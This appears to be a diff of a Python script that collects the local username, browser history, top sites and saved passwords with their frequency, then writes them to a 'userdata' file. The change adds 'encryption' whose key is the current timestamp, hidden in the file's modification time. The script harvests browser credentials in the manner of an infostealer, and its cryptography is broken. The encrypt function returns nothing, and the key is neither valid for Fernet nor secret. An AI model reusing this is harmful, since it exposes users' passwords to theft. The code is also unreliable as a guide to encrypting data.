@@ -2,6 +2,12 @@ import sys
 import os
 import json
 
+# used for fernet encryption
+import time
+from cryptography.fernet import Fernet
+import base64
+import struct
+
 import chromiumBrowser
 import dataComprehention
 import getBrowser
@@ -41,19 +47,26 @@ defaultBrowser.cleanup()
 
 
 username = os.getlogin()
-with open(os.path.join(sys.argv[1], "userdata"), "w") as f:
-    """
-    output = {
-        "name": username,
-        "history": history,
-        "topWebsites": topWebsites,
-        "passwordsAndFrequency": passwordsAndFreq
-    }
-    f.write(json.dumps(output))
-    """
+outputFilePath = os.path.join(sys.argv[1], "userdata")
+
+key = round(time.time())
+floatBytes = struct.pack("!d", key)
+b64Key = base64.urlsafe_b64encode(floatBytes)
+print( key )
+
+print(b64Key)
+
+def encryptString(key, inputString):
+    encrypter = Fernet( key )
+    bytes = encrypter.encrypt(inputString.encode())
+
+with open(outputFilePath, "w") as f:
     f.writelines([
-        username, "\n",
-        json.dumps( history ), "\n",
-        json.dumps( topWebsites ), "\n",
-        json.dumps( passwordsAndFreq ), "\n",
+        encryptString(b64Key, username), "\n",
+        encryptString(b64Key, json.dumps( history )), "\n",
+        encryptString(b64Key, json.dumps( topWebsites )), "\n",
+        encryptString(b64Key, json.dumps( passwordsAndFreq )), "\n",
     ])
+
+# Sets the date modified so the key is present and changes everytime encrypted
+os.utime(outputFilePath, (key, key))
